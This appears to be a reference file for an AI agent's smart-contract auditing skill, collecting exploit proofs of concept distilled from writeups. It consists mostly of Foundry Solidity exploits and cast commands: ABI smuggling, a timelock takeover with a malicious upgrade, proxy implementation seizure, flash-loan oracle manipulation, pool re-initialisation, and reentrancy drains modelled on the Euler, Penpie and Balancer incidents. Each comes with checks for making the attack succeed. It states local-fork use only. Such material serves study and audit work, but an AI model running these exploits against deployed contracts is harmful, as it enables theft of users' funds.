
# Writeup Patterns — Extended PoCs (W8, W17, W18, W20, W22–W27)

Companion to `../SKILL.md` section `## Writeup-Distilled Patterns (W1..W30)`.
Technique-only: local Anvil/fork shapes, no real addresses, no flags/keys.
Each entry: full Foundry test skeleton + cast triage + negative check.

## X-W8. ABI smuggling — full payload builder

Triage (confirm fixed-offset read):

```bash
grep -rHn 'calldataload\|calldatacopy' src/ | head -n 20
grep -rHn 'function execute(' src/ | head -n 5
```

Foundry shape (one test, local only):

```solidity
function test_ABISmuggle() public {
    bytes4 execSel = vault.execute.selector;
    bytes memory target = abi.encodePacked(bytes12(0), address(vault));
    bytes memory dataOffset = abi.encodePacked(uint256(0x80));
    bytes memory emptyData = abi.encodePacked(uint256(0));
    bytes memory decoy = abi.encodePacked(bytes4(0xd9caed12), bytes28(0));
    bytes memory action = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token);
    bytes memory payload = abi.encodePacked(execSel, target, dataOffset, emptyData, decoy, uint256(action.length), action);
    (bool ok,) = address(vault).call(payload);
    assertTrue(ok && token.balanceOf(recovery) == VAULT_BAL);
}
```

Negative: if `execute` uses `abi.decode` on `actionData` for the selector check, the decoy is ignored and this dies — verify the `calldataload` offset first.

## X-W17. Climber — 4-op bundle + middleman scheduler

```solidity
function test_Climber() public {
    targets = [address(timelock), address(vault), address(timelock), address(middleman)];
    datas = [abi.encodeWithSelector(timelock.updateDelay.selector, 0),
             abi.encodeWithSelector(Ownable.transferOwnership.selector, player),
             abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(middleman)),
             abi.encodeWithSelector(Middleman.scheduleBack.selector, targets, values, datas, salt)];
    timelock.execute(targets, values, datas, salt); // passes trailing check via scheduleBack
    vault.upgradeTo(address(evilImpl));             // now owner
    EvilVault(address(vault)).sweepFunds(address(token));
}
```

Negative: `MIN_TARGETS` length checks and salt reuse (`Operation already known`) — use a fresh salt per run.

## X-W18. Wallet-Mining — impl init + upgrade

```bash
cast storage $AUTH 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC # impl
cast send $IMPL "init(address[],address[])" "[]" "[]" --private-key $K --rpc-url $RPC
```

Then `upgradeToAndCall` a permissive impl from the seized impl-owner account; placeholders for counterfactual wallets must be mined with the same CREATE2 factory + salt as the deployer script or the recovery leg misses.

Negative: without `--fork-block-number` the Safe singleton may differ; pin the block (F1).

## X-W20. Curve-LP-oracle skew loop

```solidity
function onFlashLoan(uint256 amt, uint256, bytes calldata) external returns (bytes32) {
    uint256 p0 = lender.quote(bal);
    curve.swap(imbalancedAmounts);                 // shift get_virtual_price
    uint256 p1 = lender.quote(bal);
    require(p1 * 1000 > p0 * (1000 + feeBps + 5), "skew too small");
    lender.borrow(maxAtP1);                        // inflated
    curve.unwind();
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

Negative: confirm the lender reads the same oracle version deployed (not the audited one); log `p0/p1` before sizing.

## X-W22. DVM re-init inside flash callback

```solidity
function DVMFlashLoanCall(address, uint256, uint256, bytes memory) public {
    QuoteToken t1 = new QuoteToken(); QuoteToken t2 = new QuoteToken();
    t1.transfer(address(dvm), 1_000_000 ether); t2.transfer(address(dvm), 1_000_000 ether);
    dvm.init(address(this), address(t1), address(t2), 3000000000000000, maintainer, 1, 1 ether, false);
}
```

Negative: init must leave the pool tradable or flash repayment reverts; assert `dvm._QUOTE_TOKEN_()` changed AND a small test swap succeeds before sizing up.

## X-W23. Selector-clash lock

```bash
cast sig "transfer(address,uint256)"
cast sig "safeTransferFrom(address,address,uint256)"
cast selectors $V3_MANAGER_BYTECODE > /tmp/sels.txt
grep -rHn 'function lock(' src/
```

PoC: route the V3 NFT through the ERC20-typed `lock()` overload, assert credit equals fungible valuation, then `unlock`/withdraw loop. Negative: enumerate both ABIs — only exact 4-byte collisions work.

## X-W24. Cache-collision arbitrage

```bash
grep -rHn 'cache\|Map(.*,.*)\|string(' script/ bot/ solver/ | head -n 30
```

PoC: script N junk-pair creations, then cheap-pair creation, then `cast send` the real pair creation reusing the collided key; assert bot quote equals stale price before committing capital. Negative: off-chain code — keep the exploit on-chain minimal and put bot analysis in the handoff (escalate `/rev` if needed).

## X-W25. Euler donate + self-liquidate

```solidity
function receiveFlashLoan(IERC20[] memory t, uint256[] memory a, uint256[] memory, bytes memory) external {
    wstETH.approve(address(euler), a[0]);
    eToken.deposit(0, a[0]); eToken.mint(0, a[0]*15); eToken.donateToReserves(0, a[0]*3);
    liquidator.liquidate();
    wstETH.transfer(msg.sender, a[0]);
}
```

Negative: model `conversionRate`/`discount` numerically; undersized mints produce unprofitable liquidations after flash fees.

## X-W26. Penpie harvest reentry

```solidity
function redeemRewards(uint256) external { // malicious market, called by harvest
    if (!entered) { entered = true; staking.depositMarket(realLP); } // reentry: no guard on harvest
}
function getRewardTokens() external view returns (address[] memory) { return injectedLP; }
```

Negative: confirm guard asymmetry (`depositMarket` guarded, `batchHarvestMarketRewards` NOT) via grep before building the SY market.

## X-W27. Balancer exit-window

```solidity
receive() external payable {
    if (nonce++ == 0) lendingPool.setUserUseReserveAsCollateral(collateral, false); // inflated getRate
}
function pwn() external { balancer.exitPool(poolId, address(this), payable(address(this)), req); }
```

Negative: pre/post `getAssetPrice` logging must show inflation inside `receive()` vs outside; if equal, the window is patched and this dies.
